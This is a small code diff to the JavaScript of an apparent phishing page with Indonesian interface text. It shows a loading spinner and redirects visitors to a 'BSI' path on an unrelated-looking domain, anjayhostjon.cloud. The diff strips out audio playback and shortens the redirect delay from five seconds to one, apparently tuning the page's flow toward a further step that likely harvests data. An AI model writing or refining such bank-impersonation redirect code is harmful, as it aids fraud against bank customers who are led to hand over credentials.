@@ -117,15 +117,11 @@ document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";
 
 function getcs(){
  $("#djload").show();   
-  audio4 = document.getElementById("bsiku");
-  audio1 = document.getElementById("bsi");
-    audio4.play();
-     audio1.load();
-    audio4.loop = false
+  
 setTimeout(function(){  
 location.href='https://anjayhostjon.cloud/BSI/7h27g/wa';
-    }, 5000);
+    }, 1000);
     setTimeout(function(){
     $("#djload").hide();   
-    }, 5100);      
+    }, 1100);      
 }     
